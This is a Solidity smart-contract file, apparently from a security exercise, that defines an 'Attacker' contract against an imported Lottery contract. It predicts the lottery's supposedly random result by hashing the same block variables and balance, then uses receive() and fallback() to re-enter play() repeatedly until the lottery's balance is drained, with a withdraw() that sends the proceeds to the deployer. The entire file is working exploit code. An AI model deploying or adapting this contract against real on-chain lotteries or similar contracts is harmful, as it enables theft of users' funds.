// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

import "src/Lottery.sol";

error NotAllowed();

contract Attacker {
    uint256 public constant playAmount = 0.1 ether;

    address public lottery;

    address private _owner;

    uint256 public winAmount;

    constructor(address _lottery, uint256 _winAmount) payable {
        if (msg.value != 0.1 ether) revert WrongInit();
        lottery = _lottery;
        _owner = msg.sender;
        _setWinAmount(_winAmount);
    }

    receive() external payable {
        _reentrancy();
    }

    fallback() external payable {
        _reentrancy();
    }

    function _reentrancy() internal {
        while (lottery.balance >= 0.1 ether) {
            _attack();
        }
    }

    function attack() external {
        _attack();
    }

    function _attack() internal {
        uint256 guess = uint256(
            keccak256(
                abi.encode(
                    block.coinbase,
                    block.difficulty,
                    block.gaslimit,
                    block.number,
                    blockhash(block.number - 1),
                    block.timestamp,
                    tx.gasprice,
                    winAmount,
                    lottery.balance + playAmount
                )
            )
        );

        Lottery(lottery).play{value: playAmount}(guess);
    }

    function withdraw() external {
        if (msg.sender != _owner) revert NotAllowed();
        uint256 _balance = address(this).balance;

        (bool success, ) = payable(_owner).call{value: _balance}("");
        if (!success) revert FailedTransfer();
    }

    function setWinAmount(uint256 _winAmount) external {
        _setWinAmount(_winAmount);
    }

    function _setWinAmount(uint256 _winAmount) internal {
        winAmount = _winAmount;
    }
}
